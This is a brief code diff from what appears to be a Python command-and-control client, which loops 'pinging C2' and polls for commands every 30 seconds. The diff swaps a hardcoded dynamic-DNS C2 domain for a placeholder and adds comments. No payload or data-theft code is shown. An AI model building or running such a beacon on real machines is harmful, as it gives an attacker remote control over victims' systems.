@@ -24,9 +24,9 @@ def delay(s):
             time.sleep(interval)
             i += interval
 
-domain = "xts00.duckdns.org"
+domain = "<DOMAIN>" # change this
 tokens = []
-sleeptime = 30
+sleeptime = 30 # how often it checks for cmds
 
 while True:
     print("pinging C2")
